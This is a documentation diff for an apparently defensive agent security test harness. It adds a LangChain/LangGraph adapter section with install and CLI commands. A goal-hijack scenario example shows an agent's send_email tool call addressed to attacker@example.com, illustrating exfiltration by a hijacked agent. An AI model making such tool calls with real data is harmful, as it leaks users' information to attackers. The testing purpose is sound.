@@ -428,6 +428,92 @@ trace = run_openai_agents_target(scenario, agent)
 
 If the optional dependency is missing, the adapter raises `AdapterError` with an installation hint.
 
+### LangChain/LangGraph adapter
+
+The LangChain/LangGraph adapter is an MVP integration path for synchronous
+LangChain runnables and LangGraph compiled graphs that support `invoke()`.
+
+Install the optional dependency group before using real LangChain or LangGraph
+objects:
+
+```bash
+python -m pip install "owasp-agent-security-regression-harness[langchain]"
+```
+
+Supported MVP path:
+
+```text
+Scenario -> {"messages": [{"role": "user", "content": "<scenario JSON>"}]} -> target.invoke(...) -> Trace
+```
+
+The adapter supports targets loaded from an explicit `module:object` import
+path. The loaded object must provide an `invoke(input)` method or be a callable
+runner function. The first version is intentionally narrow and does not support
+streaming, every callback shape, every historical LangChain agent type, or
+complex LangGraph state introspection.
+
+CLI usage:
+
+```bash
+agent-harness run scenarios/goal_hijack/outbound_email_exfiltration_001.yaml \
+  --langchain-target examples.targets.langchain_runnable_agent:RUNNABLE
+```
+
+Optional goal event:
+
+```bash
+agent-harness run scenarios/goal_hijack/outbound_email_exfiltration_001.yaml \
+  --langchain-target examples.targets.langchain_runnable_agent:RUNNABLE \
+  --langchain-goal-event summarize_document
+```
+
+The adapter records:
+
+- the serialized scenario payload as the user message
+- the final assistant message content when available
+- tool calls found on LangChain-style `AIMessage.tool_calls`
+- OpenAI-compatible tool calls found under `additional_kwargs.tool_calls`
+- adapter and scenario metadata events
+- an optional `goal` event when `--langchain-goal-event` is supplied
+
+Example runnable output:
+
+```python
+{
+    "messages": [
+        AIMessage(
+            content="Sending the email.",
+            tool_calls=[
+                {
+                    "name": "send_email",
+                    "args": {
+                        "to": "attacker@example.com",
+                    },
+                }
+            ],
+        )
+    ]
+}
+```
+
+Resulting harness tool call:
+
+```json
+{
+  "name": "send_email",
+  "arguments": {
+    "to": "attacker@example.com"
+  }
+}
+```
+
+The adapter also accepts result dictionaries with `output`, `answer`,
+`final_output`, or `response` fields for assistant content, and `events` for
+structured trace events.
+
+If a target module imports LangChain or LangGraph but the optional dependency is
+missing, the adapter raises `AdapterError` with an installation hint.
+
 ### MCP workflow adapter
 
 The MCP workflow adapter is an MVP integration path for local
@@ -577,7 +663,6 @@ The HTTP adapter is the universal integration path. Any language or framework ca
 
 Planned adapter families include:
 
-- LangChain/LangGraph adapter
 - Full MCP host/runtime adapter support beyond the current MVP workflow adapter
   (see [MCP Adapter Design](mcp-adapter-design.md))
 
